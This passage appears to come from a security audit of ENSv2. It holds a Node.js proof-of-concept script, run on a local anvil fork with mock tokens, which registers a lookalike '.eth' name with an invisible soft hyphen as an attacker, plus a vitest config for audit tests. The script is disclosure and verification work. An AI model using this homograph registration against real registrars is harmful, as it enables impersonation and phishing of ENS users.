const wal  = createWalletClient({ account: ATTACKER, chain: sepolia, transport: http(RPC) })
const test = createTestClient({ chain: sepolia, mode: 'anvil', transport: http(RPC) })

const log = (...a) => console.log(...a)
const ok  = (c, m) => { if (!c) { console.error('  ✗ FAIL:', m); process.exitCode = 1 } else log('  ✓', m) }

/** Submit AND wait. The absence of this is what caused the v1/v2 race. */
async function send(params) {
  const hash = await wal.writeContract(params)
  return pub.waitForTransactionReceipt({ hash })
}

const nowTs = async () => Number((await pub.getBlock()).timestamp)

/** Name a custom-error selector using the real registrar ABI when we can. */
async function nameSelector(selector) {
  if (!selector) return null
  const { toFunctionSelector } = await import('viem')
  for (const p of ['@ensdomains/ensjs-abi/v2', '@ensdomains/ensjs-abi']) {
    let mod
    try { mod = await import(p) } catch { continue }
    for (const [, abi] of Object.entries(mod)) {
      if (!Array.isArray(abi)) continue
      for (const item of abi) {
        if (item?.type !== 'error') continue
        const sig = `${item.name}(${(item.inputs ?? []).map((i) => i.type).join(',')})`
        try {
          if (toFunctionSelector(sig).toLowerCase() === selector.toLowerCase()) return sig
        } catch { /* ignore */ }
      }
    }
  }
  return null
}

const selectorOf = (e) => {
  const hay = [e?.metaMessages?.join(' '), e?.details, e?.shortMessage, String(e)]
    .filter(Boolean).join(' ')
  const m = /0x[0-9a-fA-F]{8}\b/.exec(hay)
  return m ? m[0] : null
}

async function describeError(e) {
  const sel = selectorOf(e)
  const named = await nameSelector(sel)
  return `${sel ?? '(no selector)'}${named ? ` = ${named}` : ''} :: ${e?.shortMessage ?? e}`
}

async function ownerOf(label) {
  return pub.readContract({
    address: ETH_REGISTRY, abi: registryAbi, functionName: 'getOwner',
    args: [labelToCanonicalId(label)],
  })
}

async function registerLabel(label, owner) {
  const secret = keccak256(toHex(`c1-${label}-${Math.random()}`))

  const [base, premium] = await pub.readContract({
    address: ETH_REGISTRAR, abi: registrarAbi, functionName: 'getRegisterPrice',
    args: [label, DURATION, MOCK_USDC] })
  const price = base + premium

  await send({ address: MOCK_USDC, abi: erc20Abi, functionName: 'approve',
    args: [ETH_REGISTRAR, price * 4n] })

  const commitment = await pub.readContract({
    address: ETH_REGISTRAR, abi: registrarAbi, functionName: 'makeCommitment',
    args: [label, owner, secret, ZERO, ZERO, DURATION, REFERER] })

  // Commit, and learn the timestamp the chain actually recorded for it.
  const commitRcpt = await send({ address: ETH_REGISTRAR, abi: registrarAbi,
    functionName: 'commit', args: [commitment] })
  const commitBlock = await pub.getBlock({ blockNumber: commitRcpt.blockNumber })
  const commitTs = Number(commitBlock.timestamp)

  const minAge = Number(await pub.readContract({
    address: ETH_REGISTRAR, abi: registrarAbi, functionName: 'MIN_COMMITMENT_AGE' }))
  let maxAge = null
  try {
    maxAge = Number(await pub.readContract({
      address: ETH_REGISTRAR, abi: maxAgeAbi, functionName: 'MAX_COMMITMENT_AGE' }))
  } catch { /* not exposed on this build — skip the upper-bound check */ }

  // Jump relative to the COMMIT's timestamp, not to "now".
  const slack = 5
  const target = commitTs + minAge + slack
  const before = await nowTs()
  if (target > before) await test.increaseTime({ seconds: target - before })
  await test.mine({ blocks: 1 })

  // Verify the window BEFORE spending the register call, so a timing failure is
  // the harness's fault and says so, instead of looking like a verdict on the
  // label. This assertion is the whole point of v3.
  const after = await nowTs()
  const age = after - commitTs
  if (age < minAge) {
    throw new Error(
      `HARNESS: commitment age ${age}s < MIN_COMMITMENT_AGE ${minAge}s — the ` +
      `time jump did not land after the commit. This is a script bug, not a ` +
      `contract verdict on "${label}".`)
  }
  if (maxAge !== null && age >= maxAge) {
    throw new Error(
      `HARNESS: commitment age ${age}s >= MAX_COMMITMENT_AGE ${maxAge}s — ` +
      `jumped too far. Script bug, not a contract verdict on "${label}".`)
  }

  const rcpt = await send({ address: ETH_REGISTRAR, abi: registrarAbi,
    functionName: 'register',
    args: [label, owner, secret, ZERO, ZERO, DURATION, MOCK_USDC, REFERER] })
  return { status: rcpt.status, commitTs, age, minAge, maxAge }
}

async function main() {
  log('C-1 Layer 3 (v3) — on-chain registrability of a non-normalized label')
  log('RPC:', RPC)
  log('labels this run:', JSON.stringify({
    control: CONTROL, lookalike: LOOKALIKE.replace(SOFT_HYPHEN, '\\u00AD') }))
  log()

  // 0) OFF-CHAIN: the headline claim. This is where normalization is proven.
  log('[0] off-chain primitive — the invisible code point')
  ok(normalize(`${HEADLINE_LOOKALIKE}.eth`) === `${HEADLINE_REAL}.eth`,
     'normalize("vita\\u00ADlik.eth") == "vitalik.eth"  (renders identically)')
  ok(namehash(`${HEADLINE_LOOKALIKE}.eth`) !== namehash(`${HEADLINE_REAL}.eth`),
     'namehash differs — a SEPARATE, registrable node')
  ok(normalize(`${LOOKALIKE}.eth`) === `${CONTROL}.eth`,
     'this run\'s pair has the same property (lookalike normalizes to control)')
  ok(labelToCanonicalId(LOOKALIKE) !== labelToCanonicalId(CONTROL),
     'canonicalId(lookalike) != canonicalId(control)')

  // 0b) PREFLIGHT: never let "already taken" masquerade as "registrar refused".
  log('\n[0b] preflight — are these labels free on this fork?')
  const [lookOwner, ctrlOwner] = await Promise.all([ownerOf(LOOKALIKE), ownerOf(CONTROL)])
  if (lookOwner !== ZERO || ctrlOwner !== ZERO) {
    log(`  ✗ ABORT: a label is already owned (lookalike=${lookOwner}, control=${ctrlOwner}).`)
    log('    That is a stale fork, not a contract behaviour. Restart anvil.')
    process.exitCode = 1
    return
  }
  ok(true, 'both labels are unowned — a revert below is the registrar\'s doing')

  // 1) make the attacker a clean EOA + fund it (the fix for 0x57f447ce)
  log('\n[1] prep attacker EOA')
  await test.setCode({ address: ATTACKER.address, bytecode: '0x' }) // clear Sepolia code
  await test.setBalance({ address: ATTACKER.address, value: 10n ** 18n })
  await send({ address: MOCK_USDC, abi: erc20Abi, functionName: 'mint',
    args: [ATTACKER.address, 10_000_000_000n] })
  const bal = await pub.readContract({ address: MOCK_USDC, abi: erc20Abi,
    functionName: 'balanceOf', args: [ATTACKER.address] })
  ok(bal > 0n, `attacker funded with mock USDC (${bal})`)

  // 2) CONTROL: a normal label registers via this exact flow
  log('\n[2] control — register the NORMAL label the same way')
  let ctrl, cErr
  try { ctrl = await registerLabel(CONTROL, ATTACKER.address) }
  catch (e) { cErr = e }
  ok(ctrl?.status === 'success',
     `normal label "${CONTROL}" registered (status=${ctrl?.status ?? 'FAILED'})`)
  if (ctrl?.status !== 'success') {
    log('    →', cErr?.message?.startsWith('HARNESS:') ? cErr.message : await describeError(cErr))
    log('    Control failed — the harness or fork is broken, not the claim. Stop here.')
    return
  }
  log(`    commitment age at register: ${ctrl.age}s (min ${ctrl.minAge}s`
      + (ctrl.maxAge !== null ? `, max ${ctrl.maxAge}s)` : ')'))

  // 3) THE CLAIM: the non-normalized lookalike registers identically
  log('\n[3] the lookalike — register the non-normalized label')
  let look, lookErr
  try { look = await registerLabel(LOOKALIKE, ATTACKER.address) }
  catch (e) { lookErr = e }

  if (look?.status === 'success') {
    ok(true, 'lookalike (containing U+00AD) registered — status=success')
    log(`    commitment age at register: ${look.age}s (min ${look.minAge}s)`)
  } else if (lookErr?.message?.startsWith('HARNESS:')) {
    ok(false, 'harness timing problem, NOT a contract verdict')
    log('    →', lookErr.message)
    log('    Re-run. Do not read this as evidence about the label.')
  } else {
    ok(false, `lookalike REVERTED — ${await describeError(lookErr)}`)
    log('    Control succeeded, the label was verified free, and the commitment')
    log('    window was asserted before the call. If the error names the LABEL,')
    log('    the registrar validates labels and the on-chain claim must be')
    log('    withdrawn from the report. Layers 1-2 do not depend on it.')
  }

  // 4) attacker owns the lookalike node, and it is NOT the control's node
  if (look?.status === 'success') {
    log('\n[4] ownership + impersonation')
    const owner = await ownerOf(LOOKALIKE)
    ok(owner.toLowerCase() === ATTACKER.address.toLowerCase(),
       `ETHRegistry.getOwner(lookalike) == attacker (${owner})`)
    ok(labelToCanonicalId(LOOKALIKE) !== labelToCanonicalId(CONTROL),
       'the node the attacker owns is NOT the control name — but renders identically')
  }

  log('\n────────────────────────────────────────────────────────')
  log(process.exitCode
    ? '❌ Layer 3 did NOT fully confirm — see FAILs above.'
    : '✅ Layer 3 CONFIRMED: the ENSv2 registrar mints a label containing an\n' +
      '   invisible U+00AD to the attacker exactly as it does the normalized\n' +
      '   control — a distinct node that renders identically. With Layers 1-2,\n' +
      '   C-1 is proven end to end.')
}
main().catch((e) => { console.error('SCRIPT ERROR:', e?.shortMessage ?? e); process.exit(1) })
```

### apps/manager/vitest.audit.config.ts

```ts
/// <reference types="vitest" />
import { fileURLToPath } from 'node:url'
import { defineConfig } from 'vitest/config'

// Lean config for the property-based audit spec: pure logic only, no React /
// lingui / babel plugins, node environment — so cold start stays well under
// the sandbox time limit. Run with:
//   npx vitest run --config vitest.audit.config.ts
export default defineConfig({
  test: {
    globals: true,
    environment: 'node',
    include: [
      'audit/**/*.fast-check.test.ts',
      'src/audit/**/*.fast-check.test.ts',
    ],
  },
  resolve: {
    alias: {
      '@': fileURLToPath(new URL('./src', import.meta.url)),
    },
  },
})
```
